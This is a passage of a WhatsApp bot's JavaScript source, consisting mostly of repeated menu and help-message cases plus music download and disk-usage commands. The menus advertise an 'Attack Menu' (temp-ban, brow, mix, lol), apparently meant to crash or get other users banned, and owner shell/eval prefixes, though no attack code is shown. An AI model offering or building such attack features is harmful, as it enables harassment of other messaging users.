 ゲ ◦ ${prefix}brow
 ゲ ◦ ${prefix}mix
 ゲ ◦ ${prefix}lol

_*Sticker Menu*_
 ゲ ◦ ${prefix}sticker
 ゲ ◦ ${prefix}cls
 ゲ ◦ ${prefix}smeme 
 ゲ ◦ ${prefix}qc
 ゲ ◦ ${prefix}dino
 ゲ ◦ ${prefix}kuromi
 ゲ ◦ ${prefix}pucoyo
 ゲ ◦ ${prefix}ekuning

_*Tools Menu*_
 ゲ ◦ ${prefix}remini
 ゲ ◦ ${prefix}tts
 ゲ ◦ ${prefix}readvo
 ゲ ◦ ${prefix}tr
 ゲ ◦ ${prefix}jarak
 ゲ ◦ ${prefix}kalkulator
 ゲ ◦ ${prefix}get
 ゲ ◦ ${prefix}getweb
 ゲ ◦ ${prefix}shortlink
 ゲ ◦ ${prefix}tomp3

_*Ai Menu*_
 ゲ ◦ ${prefix}naw
 ゲ ◦ ${prefix}bingimg-2d
 ゲ ◦ ${prefix}gemini
 ゲ ◦ ${prefix}gemini-img
 ゲ ◦ ${prefix}sindy
 ゲ ◦ ${prefix}openai

_*Main Menu*_
 ゲ ◦ ${prefix}disk
 ゲ ◦ ${prefix}ping
 ゲ ◦ ${prefix}play
 ゲ ◦ ${prefix}playmusic
 ゲ ◦ ${prefix}whatmusic
 ゲ ◦ ${prefix}song

_*Voice Menu*_
 ゲ ◦ ${prefix}bass
 ゲ ◦ ${prefix}blown
 ゲ ◦ ${prefix}deep
 ゲ ◦ ${prefix}earrape
 ゲ ◦ ${prefix}fast
 ゲ ◦ ${prefix}fat
 ゲ ◦ ${prefix}nightcore
 ゲ ◦ ${prefix}reverse
 ゲ ◦ ${prefix}robot
 ゲ ◦ ${prefix}slow
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}tupai
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}speech

_*Group Menu*_
 ゲ ◦ ${prefix}add
 ゲ ◦ ${prefix}kick
 ゲ ◦ ${prefix}promote
 ゲ ◦ ${prefix}demote
 ゲ ◦ ${prefix}totag
 ゲ ◦ ${prefix}tagall
 ゲ ◦ ${prefix}closetime
 ゲ ◦ ${prefix}opentime
 
───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`)
 const sections = [
     {
    title: `Menu ChatAi`,
    rows: [
        {title: "Menampilkan Menu Chat-Ai", rowId: `${prefix}menuai`}
     ]
          },
    {
	title: `All Menu Bot`,
	rows: [
	    {title: "Menampilkan All Menu Bot", rowId: `${prefix}menuq`}
	]
    },
     {
    title: `Menu Owner`,
    rows: [
        {title: "Menampilkan Menu Owner", rowId: `${prefix}help11`}
]
     },
          {
    title: `Menu Attack`,
    rows: [
        {title: "Menampilkan Menu Attack", rowId: `${prefix}help22`}
     ]
          },
     {
    title: `Menu Sticker`,
    rows: [
        {title: "Menampilkan Menu Sticker", rowId: `${prefix}help33`}
     ]
          },
     {
    title: `Menu Tools`,
    rows: [
        {title: "Menampilkan Menu Tools", rowId: `${prefix}help44`}
     ]
          },
     {
    title: `Menu Ai`,
    rows: [
        {title: "Menampilkan Menu Ai", rowId: `${prefix}help55`}
     ]
          },
     {
    title: `Menu Voice`,
    rows: [
        {title: "Menampilkan Menu Voice", rowId: `${prefix}help66`}
     ]
          },
     {
    title: `Menu Group`,
    rows: [
        {title: "Menampilkan Menu Group", rowId: `${prefix}help77`}
     ]
          },
     {
    title: `Menu Tools`,
    rows: [
        {title: "Menampilkan Menu Chat Tools", rowId: `${prefix}help88`}
     ]
          },
     ]
let isian = `Hai, saya ${Kyuu}${botname}${Kyuu}, asisten cerdas Anda di WhatsApp! Saya hadir untuk membuat pekerjaan Anda lebih mudah. saya memiliki kemampuan mencari informasi, mengunduh file, Percayakan tugas-tugas sehari-hari kepada saya, dan bersama-sama kita akan menjadikan pengalaman WhatsApp Anda lebih efisien dan menyenangkan. Terima kasih telah memilih ${Kyuu}${botname}${Kyuu}\n`
const listMessage = {
  text: isian,
  footer: "created by KyuuRzy",
  title: `${Kyuu}</>  M E N U - B O T </>${Kyuu}

 ゲ ◦  Bot Name : ${botname}
 ゲ ◦  Version : ${baileysVersion}
 ゲ ◦  Baileys : ${TypeBaileys}
 ゲ ◦  Runtime : ${runtime(process.uptime())}

${Kyuu}</> I N F O - B O T </>${Kyuu}\n`,
  buttonText: "Klik Disini",
  sections
}
const tessgh = await ptz.sendMessage(from, listMessage)
{quoted:m}}
break
        
case 'menuai':{
 const sections = [
    {
	title: `Chat Ai`,
	rows: [
	    {title: "Mengaktifkan Chat Ai", rowId: `${prefix}ai on`}
	]
    },
     {
       title: `Khusus Chat Ai`,
    rows: [
        {title: "Mengnonaktifkan Chat Ai", rowId: `${prefix}ai off`}
]
     },
     ]
let isian = `Hai, saya ${Kyuu}${botname}${Kyuu}, asisten cerdas Anda di WhatsApp! Saya hadir untuk membuat pekerjaan Anda lebih mudah. saya memiliki kemampuan mencari informasi, mengunduh file, Percayakan tugas-tugas sehari-hari kepada saya, dan bersama-sama kita akan menjadikan pengalaman WhatsApp Anda lebih efisien dan menyenangkan. Terima kasih telah memilih ${Kyuu}${botname}${Kyuu}\n`
const listMessage = {
  text: isian,
  footer: "created by KyuuRzy",
  title: `${Kyuu}</>  M E N U - B O T </>${Kyuu}

 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}

${Kyuu}</> M E N U - C H A T  A I </>${Kyuu}\n`,
  buttonText: "Klik Disini",
  sections
}
const tessgh = await ptz.sendMessage(from, listMessage)
}
break
        
case "menuqq":{
if (!m.isGroup) return
const tek = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Owner Menu*_
 ゲ ◦ ${prefix}upsw
 ゲ ◦ ${prefix}bot
 ゲ ◦ ${prefix}getpp
 ゲ ◦ ${prefix}getsw
 ゲ ◦ ${prefix}addcase
 ゲ ◦ ${prefix}dellcase
 ゲ ◦ ${prefix}getcase
 ゲ ◦ $
 ゲ ◦ =>
 ゲ ◦ >

_*Attack Menu*_
 ゲ ◦ ${prefix}temp-ban
 ゲ ◦ ${prefix}brow
 ゲ ◦ ${prefix}mix
 ゲ ◦ ${prefix}lol

_*Sticker Menu*_
 ゲ ◦ ${prefix}sticker
 ゲ ◦ ${prefix}cls
 ゲ ◦ ${prefix}smeme 
 ゲ ◦ ${prefix}qc
 ゲ ◦ ${prefix}dino
 ゲ ◦ ${prefix}kuromi
 ゲ ◦ ${prefix}pucoyo
 ゲ ◦ ${prefix}ekuning

_*Tools Menu*_
 ゲ ◦ ${prefix}remini
 ゲ ◦ ${prefix}tts
 ゲ ◦ ${prefix}readvo
 ゲ ◦ ${prefix}tr
 ゲ ◦ ${prefix}jarak
 ゲ ◦ ${prefix}kalkulator
 ゲ ◦ ${prefix}get
 ゲ ◦ ${prefix}getweb
 ゲ ◦ ${prefix}shortlink
 ゲ ◦ ${prefix}tomp3

_*Ai Menu*_
 ゲ ◦ ${prefix}naw
 ゲ ◦ ${prefix}bingimg-2d
 ゲ ◦ ${prefix}gemini
 ゲ ◦ ${prefix}gemini-img
 ゲ ◦ ${prefix}sindy
 ゲ ◦ ${prefix}openai

_*Main Menu*_
 ゲ ◦ ${prefix}disk
 ゲ ◦ ${prefix}ping
 ゲ ◦ ${prefix}play
 ゲ ◦ ${prefix}playmusic
 ゲ ◦ ${prefix}whatmusic
 ゲ ◦ ${prefix}song

_*Voice Menu*_
 ゲ ◦ ${prefix}bass
 ゲ ◦ ${prefix}blown
 ゲ ◦ ${prefix}deep
 ゲ ◦ ${prefix}earrape
 ゲ ◦ ${prefix}fast
 ゲ ◦ ${prefix}fat
 ゲ ◦ ${prefix}nightcore
 ゲ ◦ ${prefix}reverse
 ゲ ◦ ${prefix}robot
 ゲ ◦ ${prefix}slow
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}tupai
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}speech

_*Group Menu*_
 ゲ ◦ ${prefix}add
 ゲ ◦ ${prefix}kick
 ゲ ◦ ${prefix}promote
 ゲ ◦ ${prefix}demote
 ゲ ◦ ${prefix}totag
 ゲ ◦ ${prefix}tagall
 ゲ ◦ ${prefix}closetime
 ゲ ◦ ${prefix}opentime

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: tek,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
case "menuq":{
const tekk = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Owner Menu*_
 ゲ ◦ ${prefix}upsw
 ゲ ◦ ${prefix}bot
 ゲ ◦ ${prefix}getpp
 ゲ ◦ ${prefix}getsw
 ゲ ◦ ${prefix}addcase
 ゲ ◦ ${prefix}dellcase
 ゲ ◦ ${prefix}getcase
 ゲ ◦ $
 ゲ ◦ =>
 ゲ ◦ >

_*Attack Menu*_
 ゲ ◦ ${prefix}temp-ban
 ゲ ◦ ${prefix}brow
 ゲ ◦ ${prefix}mix
 ゲ ◦ ${prefix}lol

_*Sticker Menu*_
 ゲ ◦ ${prefix}sticker
 ゲ ◦ ${prefix}cls
 ゲ ◦ ${prefix}smeme 
 ゲ ◦ ${prefix}qc
 ゲ ◦ ${prefix}dino
 ゲ ◦ ${prefix}kuromi
 ゲ ◦ ${prefix}pucoyo
 ゲ ◦ ${prefix}ekuning

_*Tools Menu*_
 ゲ ◦ ${prefix}remini
 ゲ ◦ ${prefix}tts
 ゲ ◦ ${prefix}readvo
 ゲ ◦ ${prefix}tr
 ゲ ◦ ${prefix}jarak
 ゲ ◦ ${prefix}kalkulator
 ゲ ◦ ${prefix}get
 ゲ ◦ ${prefix}getweb
 ゲ ◦ ${prefix}shortlink
 ゲ ◦ ${prefix}tomp3

_*Ai Menu*_
 ゲ ◦ ${prefix}naw
 ゲ ◦ ${prefix}bingimg-2d
 ゲ ◦ ${prefix}gemini
 ゲ ◦ ${prefix}gemini-img
 ゲ ◦ ${prefix}sindy
 ゲ ◦ ${prefix}openai

_*Main Menu*_
 ゲ ◦ ${prefix}disk
 ゲ ◦ ${prefix}ping
 ゲ ◦ ${prefix}play
 ゲ ◦ ${prefix}playmusic
 ゲ ◦ ${prefix}whatmusic
 ゲ ◦ ${prefix}song

_*Voice Menu*_
 ゲ ◦ ${prefix}bass
 ゲ ◦ ${prefix}blown
 ゲ ◦ ${prefix}deep
 ゲ ◦ ${prefix}earrape
 ゲ ◦ ${prefix}fast
 ゲ ◦ ${prefix}fat
 ゲ ◦ ${prefix}nightcore
 ゲ ◦ ${prefix}reverse
 ゲ ◦ ${prefix}robot
 ゲ ◦ ${prefix}slow
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}tupai
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}speech

_*Group Menu*_
 ゲ ◦ ${prefix}add
 ゲ ◦ ${prefix}kick
 ゲ ◦ ${prefix}promote
 ゲ ◦ ${prefix}demote
 ゲ ◦ ${prefix}totag
 ゲ ◦ ${prefix}tagall
 ゲ ◦ ${prefix}closetime
 ゲ ◦ ${prefix}opentime

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: tekk,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
case "help11":{
const ongner = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Owner Menu*_
 ゲ ◦ ${prefix}upsw
 ゲ ◦ ${prefix}bot
 ゲ ◦ ${prefix}getpp
 ゲ ◦ ${prefix}getsw
 ゲ ◦ ${prefix}addcase
 ゲ ◦ ${prefix}dellcase
 ゲ ◦ ${prefix}getcase
 ゲ ◦ $
 ゲ ◦ =>
 ゲ ◦ >

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: ongner,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
 
 case "help22":{
const atak = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Attack Menu*_
 ゲ ◦ ${prefix}temp-ban
 ゲ ◦ ${prefix}brow
 ゲ ◦ ${prefix}mix
 ゲ ◦ ${prefix}lol

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: atak,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
 case "help33":{
const stiker = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Sticker Menu*_
 ゲ ◦ ${prefix}sticker
 ゲ ◦ ${prefix}cls
 ゲ ◦ ${prefix}smeme 
 ゲ ◦ ${prefix}qc
 ゲ ◦ ${prefix}dino
 ゲ ◦ ${prefix}kuromi
 ゲ ◦ ${prefix}pucoyo
 ゲ ◦ ${prefix}ekuning

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: stiker,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
 case "help44":{
const tuls = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Tools Menu*_
 ゲ ◦ ${prefix}remini
 ゲ ◦ ${prefix}tts
 ゲ ◦ ${prefix}readvo
 ゲ ◦ ${prefix}tr
 ゲ ◦ ${prefix}jarak
 ゲ ◦ ${prefix}kalkulator
 ゲ ◦ ${prefix}get
 ゲ ◦ ${prefix}getweb
 ゲ ◦ ${prefix}shortlink
 ゲ ◦ ${prefix}tomp3

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: tuls,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
 case "help55":{
const ayi = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Ai Menu*_
 ゲ ◦ ${prefix}naw
 ゲ ◦ ${prefix}bingimg-2d
 ゲ ◦ ${prefix}gemini
 ゲ ◦ ${prefix}gemini-img
 ゲ ◦ ${prefix}sindy
 ゲ ◦ ${prefix}openai

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: ayi,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
 case "help66":{
const vois = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Voice Menu*_
 ゲ ◦ ${prefix}bass
 ゲ ◦ ${prefix}blown
 ゲ ◦ ${prefix}deep
 ゲ ◦ ${prefix}earrape
 ゲ ◦ ${prefix}fast
 ゲ ◦ ${prefix}fat
 ゲ ◦ ${prefix}nightcore
 ゲ ◦ ${prefix}reverse
 ゲ ◦ ${prefix}robot
 ゲ ◦ ${prefix}slow
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}tupai
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}speech

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: vois,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
 case "help77":{
const gruk = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Group Menu*_
 ゲ ◦ ${prefix}add
 ゲ ◦ ${prefix}kick
 ゲ ◦ ${prefix}promote
 ゲ ◦ ${prefix}demote
 ゲ ◦ ${prefix}totag
 ゲ ◦ ${prefix}tagall
 ゲ ◦ ${prefix}closetime
 ゲ ◦ ${prefix}opentime

───────────────────────
${Kyuu}${footer}${Kyuu}
───────────────────────`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: gruk,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
        
case "help88":{
const maen = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
 ゲ ◦ ⛩️ Bot Name : ${botname}
 ゲ ◦ ⛩️ Version : ${baileysVersion}
 ゲ ◦ ⛩️ Baileys : ${TypeBaileys}
 ゲ ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Main Menu*_
 ゲ ◦ ${prefix}disk
 ゲ ◦ ${prefix}ping
 ゲ ◦ ${prefix}play
 ゲ ◦ ${prefix}playmusic
 ゲ ◦ ${prefix}whatmusic
 ゲ ◦ ${prefix}song

${Kyuu}${footer}${Kyuu}`
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: maen,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: m,ephemeralExpiration: 86400});
}
        break
//=================================================//
case 'ai':
 if (!isCreator) return
 if (args.length < 1) return m.reply('perilah apa?')
 if (q == 'on') {
 global.db.data.chats[m.chat].ai = true
 m.reply('Sukses mengaktifkan chat ai')
 } else if (q == 'off') {
 global.db.data.chats[m.chat].ai = false
 m.reply('Sukes menonaktifkan chat ai')
 } else {
 m.reply('Agak Laen')
 }
 break
      
 case "play2":
        {
          const streamPipeline = promisify(pipeline);
          if (!text) return m.reply(`*Example* : ${prefix}${command} Drunk Text`);
          await ptz.sendMessage(m.chat, {
            react: {
              text: "⏳",
              key: m.key,
            },
          });
          await ptz.sendMessage(m.chat, {
            react: {
              text: "3️⃣",
              key: m.key,
            },
          });
          await ptz.sendMessage(m.chat, {
            react: {
              text: "2️⃣",
              key: m.key,
            },
          });
          await ptz.sendMessage(m.chat, {
            react: {
              text: "1️⃣",
              key: m.key,
            },
          });
          await ptz.sendMessage(m.chat, {
            react: {
              text: "☑️",
              key: m.key,
            },
          });
          try {
            let search = await yts(text);
            let vid =
              search.videos[Math.floor(Math.random() * search.videos.length)];
            if (!search) return m.reply("Video Not Found, Try Another Title");
            let { title, thumbnail, timestamp, views, ago, url } = vid;
            let wm = "2024 © KyuuRzy";

            const audioStream = ytdl(url, {
              filter: "audioonly",
              quality: "highestaudio",
            });

            // Get the path to the system's temporary directory
            const tmpDir = os.tmpdir();

            // Create writable stream in the temporary directory
            const writableStream = fs.createWriteStream(
              `${tmpDir}/${title}.mp3`,
            );

            // Start the download
            await streamPipeline(audioStream, writableStream);

            let doc = {
              audio: {
                url: `${tmpDir}/${title}.mp3`,
              },
              mimetype: "audio/mp4",
              fileName: `${title}`,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true,
                  renderLargerThumbnail: false,
                  mediaType: 1,
                  mediaUrl: url,
                  title: title,
                  body: "2024 © KyuuRzy",
                  sourceUrl: url,
                  thumbnail: await (await ptz.getFile(thumbnail)).data,
                },
              },
            };

            await ptz.sendMessage(m.chat, doc, { quoted: m });

            // Delete the audio file
            fs.unlink(`${tmpDir}/${title}.mp3`, (err) => {
              if (err) {
                console.error(`Failed to delete audio file: ${err}`);
              } else {
                console.log(`Deleted audio file: ${tmpDir}/${title}.mp3`);
              }
            });
          } catch (e) {
            console.log(e);
            m.reply(`Failed :(`);
          }
        }
        break; 
        
case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}
break
        
 case 'song': {
if (!text) return m.reply(`Example : ${prefix + command} Upin Ipin`)
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let piw = `乂 S O N G

   ◦  Ext : Search
   ◦  ID : ${anu.videoId}
   ◦  Duration : ${anu.timestamp}
   ◦  Viewers : ${anu.views}
   ◦  Upload At : ${anu.ago}
   ◦  Author : ${anu.author.name}
   ◦  Description : ${anu.description}
   
`
ptz.sendMessage(m.chat, {
text: piw,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${anu.title}`,
body: '',
thumbnailUrl: anu.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
downloadMp3(anu.url)
}
break
  
case'getpp':{
if (!isCreator) return
